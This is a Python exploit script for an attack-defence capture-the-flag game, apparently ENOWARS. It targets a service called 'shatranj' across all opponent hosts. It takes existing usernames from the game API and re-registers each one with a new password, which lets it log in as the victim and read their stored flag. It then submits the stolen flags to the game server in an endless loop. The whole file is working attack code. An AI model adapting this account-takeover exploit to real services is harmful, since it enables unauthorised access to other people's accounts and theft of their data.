#!/usr/bin/env python3
import requests, json, time, sys, uuid
from pwn import *

timeout = 20

def find_targets(service):
    attack = requests.get(url="https://5.enowars.com/api/attackinfo").json()
    targets = {}
    for host in attack['services'][service]:
        users = []
        for tick in attack['services'][service][host]:
            for i in attack['services'][service][host][tick]:
                users.extend(attack['services'][service][host][tick][i])
        targets[host] = users
    return targets

def get_shatranj_flag(host, user):
    password = uuid.uuid4().hex[:14]
    base_url = 'http://' + host + ':8080'
    # register
    payload = {"username":user,"password":password}
    r = requests.post(base_url + '/api/register', json=payload, timeout=timeout)
    if r.status_code != 200:
        print('failed to register', r.text)
        return None
    # login
    r = requests.get(base_url + '/api/login', auth=(user, password), timeout=timeout)
    if r.status_code != 200:
        print('failed to login', r.text)
        return None
    jar = r.cookies
    # get flag
    r = requests.get(base_url + '/api/pastgames', auth=(user, password), cookies=jar, timeout=timeout)
    if r.status_code != 200:
        print('failed to get flag', r.text)
        return None
    # return flag
    if len(r.json()) == 0:
        return None
    else:
        return(r.json()[0]['name'])

def submit_flag(flag):
    print('attempting to submit: ' + flag)
    c = remote("10.0.13.37", 1337)
    c.send(flag + "\n")
    result = c.recvline(timeout=timeout)
    print(str(result))
    c.close()

def attack_loop():
    submitted_flags = set()
    attempted_users = set()
    while True:
        targets = None
        try:
            targets = find_targets("shatranj")
        except:
            sleep(1)
            continue

        for target, users in targets.items():
            skip = set()
            for user in users:
                if user in attempted_users or target in skip:
                    continue
                print(target, user)
                flag = None
                # people do mean things to my connections
                # wrap this bad boy in a try block
                try:
                    flag = get_shatranj_flag(target, user)
                except requests.exceptions.Timeout:
                    # skip for now and try again later
                    print('target ' + target + ' timed out, skipping')
                    skip.add(target)
                except:
                    flag = None

                attempted_users.add(user)
                if flag != None and flag not in submitted_flags:
                    submit_flag(flag)
                    submitted_flags.add(flag)

        sleep(1)

if __name__ == "__main__":
    attack_loop()

